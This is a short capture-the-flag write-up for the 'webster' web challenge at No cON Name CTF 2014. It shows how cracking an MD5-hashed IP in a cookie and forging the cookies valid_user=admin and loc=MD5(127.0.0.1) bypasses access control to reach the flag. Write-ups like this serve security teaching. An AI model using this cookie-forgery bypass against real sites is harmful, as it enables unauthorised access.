## No cON Name CTF 2014 - webster (Web 200)
##### 14/09/2014 (20hr)
___

### Description: 
Super-secure cloud service.

https://ctf.noconname.org/webster/

___
### Solution
Try to login in the form. After few attempts login as test:test
Let's look the .htaccess file:
```
   Order allow,deny  
   Deny from all  
   Satisfy all  
```

In order to satisfy this rule we should be on the same lan with the server.
Let's look at the cookies:
```
	loc=c869d000ef5c6fdfa128b058d2865512;
```

After few tries, we finally can crack the hash:
```
	md5(10.128.29.136) = c869d000ef5c6fdfa128b058d2865512
```

Let's set the ip to localhost (127.0.0.1):
```
	MD5(127.0.0.1): f528764d624db129b32c21fbca0cb8d6
```

Change the from: ``` Cookie: valid_user=test; loc=c869d000ef5c6fdfa128b058d2865512; ```

to:              ``` Cookie: valid_user=admin;loc=f528764d624db129b32c21fbca0cb8d6; ```

Finally make a request to:
```
	https://ctf.noconname.org/webster/content.php?op=4
```

and get the flag: **NCN_f528764d624db129b32c21fbca0cb8d6**
___
